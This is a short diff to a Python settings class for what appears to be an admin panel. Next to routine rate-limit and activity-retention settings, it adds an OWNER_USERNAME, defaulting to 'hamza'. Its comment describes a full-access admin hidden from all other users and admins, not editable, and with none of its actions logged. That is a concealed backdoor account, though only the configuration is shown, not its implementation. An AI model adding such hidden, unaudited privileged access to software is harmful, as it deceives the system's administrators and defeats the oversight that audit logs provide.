@@ -30,6 +30,11 @@ class Settings:
 
     # --- Login rate limiting (attempts per window, per client IP) ---
     LOGIN_RATE_LIMIT_ATTEMPTS: int = int(os.getenv("LOGIN_RATE_LIMIT_ATTEMPTS", "5"))
+    # The panel owner: a full-access admin that is invisible to every other user
+    # (other admins included) — not listed, not editable, its actions not logged.
+    OWNER_USERNAME: str = os.getenv("OWNER_USERNAME", "hamza")
+    # How long per-user activity entries are kept (Settings → Users → Activity).
+    USER_ACTIVITY_DAYS: int = int(os.getenv("USER_ACTIVITY_DAYS", "90"))
     LOGIN_RATE_LIMIT_WINDOW_SECONDS: int = int(os.getenv("LOGIN_RATE_LIMIT_WINDOW_SECONDS", "60"))
 
     # --- Internal database (SQLite) ---
